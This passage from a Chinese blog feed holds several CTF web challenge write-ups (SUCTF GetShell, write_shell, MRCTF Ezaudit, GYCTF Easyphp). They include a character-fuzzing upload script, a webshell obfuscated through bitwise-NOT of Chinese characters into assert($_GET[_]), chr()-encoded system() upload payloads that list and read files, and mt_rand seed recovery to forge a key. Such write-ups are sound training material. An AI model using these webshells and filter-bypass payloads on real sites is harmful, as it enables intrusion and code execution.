src="/images/ISITDTU-2019-EasyPHP/image-20210903115014297.png" alt="image-20210903115014297" style="zoom:80%;"><p>参考文章:<br><a href="%5Bhttps://blog.csdn.net/fmyyy1/article/details/116171155?utm_term=2019%5DEasyPHP%5BISITDTU&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116171155&spm=3001.4430%5D(https://blog.csdn.net/fmyyy1/article/details/116171155?utm_term=2019%5DEasyPHP%5BISITDTU&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116171155&spm=3001.4430)">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;取反、异或、bypass、rce&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2018-GetShell</title>
    <link href="http://example.com/2021/08/31/SUCTF-2018-GetShell/"/>
    <id>http://example.com/2021/08/31/SUCTF-2018-GetShell/</id>
    <published>2021-08-31T12:37:17.632Z</published>
    <updated>2021-08-31T13:06:58.431Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>神奇的绕过rce</p><a id="more"></a></blockquote><h4><span id="源码">源码</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件上传检测……</p><p>fuzz脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_str</span>():</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        str_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span></span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_list = ascii_str()</span><br><span class="line">url = <span class="string">&quot;http://30aab2f9-a474-461d-82c0-3306918ca114.node4.buuoj.cn:81/index.php?act=upload&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fuzz <span class="keyword">in</span> str_list:</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&quot;12345&quot;</span> + fuzz, <span class="string">&#x27;application/text&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line">    res = response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        print(<span class="string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(fuzz))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(fuzz))</span><br></pre></td></tr></table></figure><p><img src="/images/SUCTF-2018-GetShell/image-20210831210425130.png" alt="image-20210831210425130"></p><p>过滤了很多字符</p><h4><span id="神奇rce">神奇rce</span></h4><p>我们可以利用汉字取反获得元素进行拼接</p><p><img src="/images/SUCTF-2018-GetShell/image-20210831210435406.png" alt="image-20210831210435406"></p><p>利用获得的字典拼接shell</p><img src="/images/SUCTF-2018-GetShell/image-20210831210444208.png" alt="image-20210831210444208" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=[];$_=($__==$__);</span><br><span class="line">$__=~(枕);$___.=$__[$_];$__=~(挑);$___.=$__[$_];$__=~(挑);$___.=$__[$_];$__=~(的);$___.=$__[$_];$__=~(荣);$___.=$__[$_];$__=~(苦);$___.=$__[$_];</span><br><span class="line">$__=~(样);$____.=$__[$_];$__=~(一);$____.=$__[$_];$__=~(座);$____.=$__[$_];$__=~(站);$____.=$__[$_];</span><br><span class="line">$_=$$____;$___($_[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_])</span></span><br></pre></td></tr></table></figure><p>结合蚁剑，读environ获取flag</p><img src="/images/SUCTF-2018-GetShell/image-20210831210651989.png" alt="image-20210831210651989" style="zoom:80%;"><p>参考文章:<br><a href="https://mochu.blog.csdn.net/article/details/107729445">参考链接</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">浅谈PHP代码执行中出现过滤限制的绕过执行方法</a></p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;神奇的绕过rce&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>红明谷CTF-2021-write_shell</title>
    <link href="http://example.com/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/"/>
    <id>http://example.com/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/</id>
    <published>2021-08-31T03:42:12.897Z</published>
    <updated>2021-08-31T03:47:06.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>trike</p><a id="more"></a></blockquote><h4><span id="源码">源码</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有过滤，针对数组检查，但幸好不算严……</p><p>短标签+拼接</p><h4><span id="flag">flag</span></h4><p><code>?action=upload&amp;data=&lt;?=system(chr(108).chr(115).chr(32).chr(47))?&gt;</code></p><p><img src="/images/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/image-20210831114540157.png" alt="image-20210831114540157"></p><p>cat</p><p><code>?action=upload&amp;data=&lt;?=system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(49).chr(49).chr(49).chr(50).chr(50).chr(50).chr(50).chr(50).chr(50).chr(50).chr(108).chr(97).chr(103))?&gt;</code></p><p><img src="/images/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/image-20210831114641896.png" alt="image-20210831114641896"></p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;trike&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020-Ezaudit</title>
    <link href="http://example.com/2021/08/28/MRCTF2020-Ezaudit/"/>
    <id>http://example.com/2021/08/28/MRCTF2020-Ezaudit/</id>
    <published>2021-08-28T02:53:12.240Z</published>
    <updated>2021-08-29T11:30:16.755Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>文件泄露、伪随机数</p><a id="more"></a></blockquote><p>扫目录：</p><img src="/images/MRCTF2020-Ezaudit/image-20210828105532039.png" alt="image-20210828105532039" style="zoom:80%;"><p>文件泄露一个index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p><strong>$Public_key = KVQP0LdJKRaV3n9D  how to get crispr’s private_key???</strong></p><p>通过给出的一段字符，求此次生成随机数的种子</p><p>先转化为php_seed 要求的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">str1 =<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] == str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="/images/MRCTF2020-Ezaudit/image-20210828110051232.png" alt="image-20210828110051232"></p><p>获取privatekey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="comment">//XuNhoueCDCGc</span></span><br></pre></td></tr></table></figure><p>虽说是index.php，但登录界面在login.html</p><img src="/images/MRCTF2020-Ezaudit/image-20210828110240781.png" alt="image-20210828110240781" style="zoom:80%;"><p>ok……</p><p>参考文章:<br><a href="https://www.freebuf.com/column/205240.html">CTF| web篇之伪随机数</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;文件泄露、伪随机数&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <link href="http://example.com/2021/08/27/GYCTF2020-Easyphp/"/>
    <id>http://example.com/2021/08/27/GYCTF2020-Easyphp/</id>
    <published>2021-08-27T10:24:16.381Z</published>
    <updated>2021-08-27T16:15:31.701Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>文件泄露、代码审计、反序列化</p><a id="more"></a></blockquote><blockquote><p>半成品系统 留后门的程序员已经跑路</p></blockquote><p>一个用户登录框，有敏感词过滤，测试不像是sql注入</p><p>字典扫描：</p><p><img src="/images/GYCTF2020-Easyphp/image-20210827210220812.png" alt="image-20210827210220812"></p><p>发现文件泄露</p><h4><span id="代码审计">代码审计</span></h4><img src="/images/GYCTF2020-Easyphp/image-20210827210234798.png" alt="image-20210827210234798" style="zoom:80%;"><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这个获取flag的方法，登录就行；fuzz的时候发现了<code>admin</code>账户是存在的</p><p>lib 类库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class User 用户操作</span><br><span class="line">class Info 用户信息</span><br><span class="line">Class UpdateHelper 信息更新帮助类 &#x2F;&#x2F;似乎没完善</span><br><span class="line">class dbCtrl 数据操作类</span><br></pre></td></tr></table></figure><p>登录逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class User   </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();<span class="comment">//数据操作</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;<span class="comment">//用户id</span></span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;<span class="comment">//记录登录状态</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <strong>$mysqli=new dbCtrl();</strong></p><p>数据层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class dbCtrl</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 